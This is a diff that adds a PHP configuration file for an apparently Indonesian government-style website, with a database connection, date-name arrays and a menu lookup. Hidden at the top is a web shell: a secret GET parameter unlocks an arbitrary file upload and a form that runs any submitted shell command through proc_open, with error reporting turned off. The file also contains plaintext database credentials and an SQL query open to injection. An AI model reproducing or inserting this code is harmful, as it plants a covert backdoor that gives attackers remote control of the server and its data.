@@ -1,0 +1,69 @@
+<?php
+
+error_reporting(0); set_time_limit(0);
+if(isset($_GET['sawojunior']))
+{
+
+$filename = $_FILES['file']['name'];
+$filetmp  = $_FILES['file']['tmp_name'];
+echo "<br><form method='POST' enctype='multipart/form-data'>
+<input type='file' name='file' />
+<input type='submit' value='>>>' />
+</form>";
+echo '<form method="post">
+<input type="text" name="xmd" size="30">
+<input type="submit" value="Kill">
+</form>';
+if(move_uploaded_file($filetmp,$filename)=='1'){
+echo '[OK] ===> '.$filename;
+}
+if(isset($_POST['xmd'])){
+$xmd=$_POST['xmd'];
+$descriptors = [
+  0 => ['pipe', 'r'], // stdin
+  1 => ['pipe', 'w'], // stdout
+  2 => ['pipe', 'w'], // stderr
+];
+
+$process = proc_open($xmd, $descriptors, $pipes);
+
+$output = stream_get_contents($pipes[1]);
+$error = stream_get_contents($pipes[2]);
+
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+echo "<textarea  cols=30 rows=15;>$output";
+echo "Error:\n$error\n";
+}
+}
+
+
+$mysql_hostname = "localhost";
+$mysql_user = "c23tataruang";
+$mysql_password = "SmmWp#55";
+$mysql_database = "c23tataruang";
+$koneksi = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
+
+//$pathweb		= "http://".$_SERVER['HTTP_HOST']."/";
+
+$pathweb = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+
+$array_hari = array(1 => "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu");
+$array_bulan = array(1 => "Januari", 2 => "Februari", 3 => "Maret", 4 => "April", 5 => "Mei", 6 => "Juni", 7 => "Juli", 8 => "Agustus", 9 => "September", 10 => "Oktober", 11 => "November", 12 => "Desember");
+
+function cek_namamenu($menu_id)
+{
+	global $koneksi;
+	$sql 	= "select * from  menu_utama where id = '" . $menu_id . "'";
+	$hasil 	= mysqli_query($koneksi, $sql );
+	if (mysqli_num_rows($hasil) > 0) {
+		while ($baris = mysqli_fetch_array($hasil)) {
+			return $baris['judul'];
+		}
+	} else {
+		return "";
+	}
+}
